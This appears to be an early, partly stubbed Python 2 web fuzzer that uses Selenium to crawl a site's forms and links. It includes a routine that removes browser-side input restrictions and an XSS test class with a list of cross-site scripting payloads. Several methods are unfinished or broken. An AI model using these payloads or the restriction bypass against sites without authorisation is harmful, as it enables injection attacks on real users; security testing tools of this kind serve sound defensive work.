#!/usr/bin/env python
"""MONSTER

Usage:
    monster.py
    monster.py --help
    monster.py attack --fuzz_types=<ft> URL

Options:
    --help                 Show this help message
    --fuzz_types=<ft>      Comma-separated list of types of fuzz tests to run

"""

# import unittest

from docopt import docopt
from selenium import webdriver


SET_ATTR_SCRIPT = """var elem = document.querySelector('{selector}');
elem.{attr} = {val};
"""


class MonsterClient(object):

    def __init__(self, url):
        self.driver = webdriver.Firefox()
        self.base_url = url

    def get(self, url):
        self.driver.get(url)

    def get_elem_attrs(self, elem):
        attr_names = [
            'action', 'class', 'href', 'id', 'maxlength', 'name', 'type'
        ]
        attrs = {}
        for name in attr_names:
            attrs[name] = elem.get_attribute(name)
        return attrs

    def get_best_selector(self, elem):
        attrs = self.get_elem_attrs(elem)
        if attrs['id']:
            return '#{0}'.format(attrs['id'])
        elif attrs['name']:
            return 'name={0}'.format(attrs['name'])
        elif attrs['class']:
            return '.{0}'.format(attrs['class'])
        elif elem.tag_name:
            return elem.tag_name
        else:
            return False

    def set_elem_attr(self, elem, attr, val):
        selector = self.get_best_selector(elem)
        if selector:
            self.set_elem_attr_by_selector(selector, attr, val)
        else:
            raise Exception("Couldn't find selector")

    def set_elem_attr_by_selector(self, selector, attr, val):
        self.driver.execute_script(SET_ATTR_SCRIPT.format(
            selector=selector, attr=attr, val=val
        ))


class MonsterSpider(MonsterClient):

    def __init__(self, url):
        super(MonsterSpider, self).__init__(url)
        self.get(self.base_url)

    def get_forms(self, forms=[], depth=0, max_depth=4):
        if depth < max_depth:
            forms.extend(self.driver.find_elements_by_tag_name('form'))
            forms.extend(self.get_hard_forms(forms, depth=depth+1))
            forms = list(set(forms))
        return forms

    def get_hard_forms(self, forms=None, depth=0, max_depth=4):
        forms = []
        curr_url = self.base_url

        if depth < max_depth:
            for button in self.get_buttons():
                button.click()
                if self.driver.current_url != curr_url:
                    self.driver.back()
                else:
                    forms.extend(self.get_forms(forms, depth=depth+1))

            for link in self.get_links():
                link.click()
                if self.driver.current_url != curr_url:
                    self.driver.back()
                else:
                    forms.extend(self.get_forms(forms, depth=depth+1))

            return list(set(forms))

    def get_buttons(self):
        return self.driver.find_elements_by_tag_name('button')

    def get_links(self):
        return self.driver.find_elements_by_tag_name('a')

    def get_form_inputs(self, form):
        return form.find_elements_by_tag_name('input')

    def spider(self):
        self.get(self.base_url)
        forms = self.get_forms()
        links = self.get_links()

        return {
            'base_url': self.base_url,
            'forms': forms,
            'links': links,
        }


class MonsterAttacker(MonsterClient):

    def __init__(self, spider_log):
        """
        self.driver = spider_log['driver']
        """
        super(MonsterAttacker, self)
        self.attacks = {
            'xss': XSSTest()
        }

    def go(self):
        print 'ha'

    def neuter_input(self, elem):
        attrs = self.get_cleanup_attrs(elem)
        bad_types = [
            'color', 'date', 'datetime', 'datetime-local', 'email', 'month',
            'number', 'range', 'search', 'tel', 'time', 'url', 'week'
        ]
        if attrs['type']:
            if attrs['type'] in bad_types:
                self.set_elem_attr(elem, 'type', '"text"')
        if attrs['maxlength']:
            self.set_elem_attr(elem, 'maxLength', 5000)


class MonsterTest(MonsterClient):
    data = {}

    def __init__(self, spider_log):
        print 'hahahha'

    def get_strings(self):
        return self.data.values()

    def verify_response(self):
        print 'ha'


class XSSTest(MonsterTest):

    data = {
        'double_bracket': '<<script>alert(1);//<</script>',
        'tag_close': '\'"><script>alert(1);</script>',
        'img_js_link': '<IMG SRC=javascript:alert(1)>',
        'img_js_link_w_0x0D': '<IMG SRC=jav&#x0D;ascript:alert(1);>',
        'img_js_link_overencode':
            "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:alert(1);'>",
        'iframe_js_link': '<IFRAME SRC=javascript:alert(1)></IFRAME>',
        'js_context': '\\\'";alert(1);//'
    }

    def verify_response():
        print 'ha'


def main(args):
    ms = MonsterSpider('http://localhost:8081/test_site.html')
    forms = ms.get_forms()
    for form in forms:
        print form.get_attribute('name')
        print form.find_elements_by_tag_name('input')

if __name__ == '__main__':
    args = docopt(__doc__, version='0.0')
    main(args)
